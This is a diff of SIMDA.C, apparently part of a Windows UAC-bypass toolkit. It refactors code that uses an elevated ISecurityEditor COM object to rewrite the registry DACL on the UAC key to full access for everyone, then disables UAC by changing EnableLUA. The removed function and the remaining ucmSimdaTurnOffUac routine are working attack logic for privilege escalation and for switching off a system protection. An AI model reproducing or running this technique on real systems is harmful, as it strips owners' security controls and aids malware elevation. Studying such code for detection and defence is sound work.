@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     3.24
+*  VERSION:     3.27
 *
-*  DATE:        20 Apr 2020
+*  DATE:        10 Sep 2020
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -17,113 +17,6 @@
 *
 *******************************************************************************/
 #include "global.h"
-
-/*
-* ucmMasqueradedAlterObjectSecurityCOM
-*
-* Purpose:
-*
-* Change object security through ISecurityEditor(SetNamedInfo).
-* This function expects that supMasqueradeProcess was called on process initialization.
-*
-*/
-DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
-    _In_ LPWSTR lpTargetObject,
-    _In_ SECURITY_INFORMATION SecurityInformation,
-    _In_ SE_OBJECT_TYPE ObjectType,
-    _In_ LPWSTR NewSddl
-)
-{
-    HRESULT          r = E_FAIL, hr_init;
-    ISecurityEditor *SecurityEditor = NULL;
-#ifdef _DEBUG
-    CLSID            xCLSID;
-    LPOLESTR         pps;
-#endif
-
-    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-
-    do {
-#ifdef _DEBUG
-        r = CLSIDFromString(
-            T_CLSID_ShellSecurityEditor,
-            &xCLSID);
-
-        if (r != NOERROR)
-            break;
-
-        r = CoCreateInstance(
-            &xCLSID,
-            NULL,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
-            &IID_ISecurityEditor,
-            &SecurityEditor);
-
-        if (r != S_OK)
-            break;
-
-        if (SecurityEditor == NULL) {
-            r = E_OUTOFMEMORY;
-            break;
-        }
-
-        SecurityEditor->lpVtbl->Release(SecurityEditor);
-#endif
-
-        r = ucmAllocateElevatedObject(
-            T_CLSID_ShellSecurityEditor,
-            &IID_ISecurityEditor,
-            CLSCTX_LOCAL_SERVER,
-            &SecurityEditor);
-
-        if (r != S_OK)
-            break;
-
-        if (SecurityEditor == NULL) {
-            r = E_OUTOFMEMORY;
-            break;
-        }
-
-#ifdef _DEBUG
-        pps = NULL;
-        r = SecurityEditor->lpVtbl->GetSecurity(
-            SecurityEditor,
-            lpTargetObject,
-            ObjectType,
-            SecurityInformation,
-            &pps
-        );
-
-        if ((r == S_OK) && (pps != NULL)) {
-            OutputDebugStringW(pps);
-        }
-#endif
-
-        r = SecurityEditor->lpVtbl->SetSecurity(
-            SecurityEditor,
-            lpTargetObject,
-            ObjectType,
-            SecurityInformation,
-            NewSddl
-        );
-
-#ifdef _DEBUG
-        if (r == S_OK) {
-            OutputDebugStringW(NewSddl);
-        }
-#endif
-
-    } while (FALSE);
-
-    if (SecurityEditor != NULL) {
-        SecurityEditor->lpVtbl->Release(SecurityEditor);
-    }
-
-    if (hr_init == S_OK)
-        CoUninitialize();
-
-    return SUCCEEDED(r);
-}
 
 /*
 * ucmSimdaTurnOffUac
@@ -148,7 +41,7 @@ NTSTATUS ucmSimdaTurnOffUac(
     OBJECT_ATTRIBUTES  obja;
     UNICODE_STRING     usEnableLua = RTL_CONSTANT_STRING(L"EnableLUA");
 
-    if (ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
+    if (ucmMasqueradedSetObjectSecurityCOM(T_UACKEY,
         DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE))
     {
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
@@ -174,7 +67,7 @@ NTSTATUS ucmSimdaTurnOffUac(
     }
 
     if (NT_SUCCESS(MethodResult)) {
-        ucmShowMessage(g_ctx->OutputToDebugger, T_SIMDA_UAC);
+        ucmShowMessageById(g_ctx->OutputToDebugger, IDSB_SIMDA_UAC);
     }
 
     return MethodResult;
